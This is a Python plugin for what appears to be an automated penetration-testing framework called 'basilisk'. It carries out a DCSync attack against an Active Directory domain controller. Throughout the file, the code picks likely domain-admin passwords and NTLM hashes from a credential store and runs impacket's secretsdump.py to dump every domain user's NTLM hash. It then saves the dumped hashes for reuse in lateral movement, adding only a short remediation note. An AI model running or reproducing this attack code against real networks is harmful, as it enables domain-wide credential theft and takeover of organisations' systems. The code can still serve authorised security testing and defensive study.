"""DCSync — replicate AD credentials via MS-DRSR (requires replication rights)."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)


class DcSyncPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="dcsync",
        display_name="DCSync Attack",
        category=PluginCategory.LATERAL,
        description="Replicate AD credentials via Directory Replication Service",
        produces=["credentials"],
        timeout=120.0,
        requires_http=False,
        requires_credentials=True,
        risk_level="destructive",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"hashes": [], "success": False}

        if not ctx.creds:
            return PluginResult.fail(
                self.meta.name, target.host, error="No credential store",
            )

        domain = target.meta.get("ad_domain", "")
        dc_ip = target.meta.get("dc_ip", target.host)

        if not domain:
            findings.append(Finding.info(
                "No AD domain configured for DCSync",
                tags=["lateral", "dcsync"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        # Get credentials with potential replication rights
        all_creds = ctx.creds.get_for_target(target.host)
        domain_admin_creds = [
            c for c in all_creds
            if c.domain and (
                "admin" in c.username.lower()
                or c.username.lower() == "administrator"
            )
        ]

        # Also try NTLM hashes
        ntlm_creds = ctx.creds.get_by_type("ntlm_hash")
        creds_to_try = domain_admin_creds + ntlm_creds

        if not creds_to_try:
            findings.append(Finding.info(
                "No domain admin credentials available for DCSync",
                tags=["lateral", "dcsync"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        if not ctx.subprocess_mgr:
            findings.append(Finding.info(
                "subprocess_mgr not available for impacket",
                tags=["lateral", "dcsync"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        # Try secretsdump.py
        for cred in creds_to_try[:3]:
            if ctx.should_stop:
                break

            if cred.secret_type == "ntlm_hash":
                auth = f"-hashes :{cred.secret}"
            else:
                auth = f"'{cred.secret}'"

            domain_prefix = f"{domain}/" if domain else ""
            cmd = (
                f"secretsdump.py {domain_prefix}{cred.username}@{dc_ip} "
                f"{auth} -just-dc-ntlm"
            )
            result = await ctx.subprocess_mgr.run(cmd, timeout=60)

            if result.returncode == 0 and result.stdout:
                lines = result.stdout.strip().splitlines()
                hash_lines = [
                    ln for ln in lines if ":::" in ln
                ]
                if hash_lines:
                    data["success"] = True
                    data["hashes"] = hash_lines[:100]

                    # Store hashes in credential store
                    for hash_line in hash_lines[:50]:
                        parts = hash_line.split(":")
                        if len(parts) >= 4:
                            ctx.creds.add(
                                username=parts[0],
                                secret=parts[3],
                                secret_type="ntlm_hash",
                                source="dcsync",
                                target=target.host,
                                domain=domain,
                            )

                    findings.append(Finding.critical(
                        f"DCSync successful — {len(hash_lines)} hashes dumped",
                        evidence="\n".join(hash_lines[:10]),
                        description="All domain user NTLM hashes extracted",
                        remediation=(
                            "Review replication rights, enable Protected Users, "
                            "monitor for DRS replication events (4662)"
                        ),
                        tags=["lateral", "dcsync", "credential"],
                    ))
                    break

        if not data["success"]:
            findings.append(Finding.info(
                "DCSync failed — insufficient privileges or connectivity",
                tags=["lateral", "dcsync"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
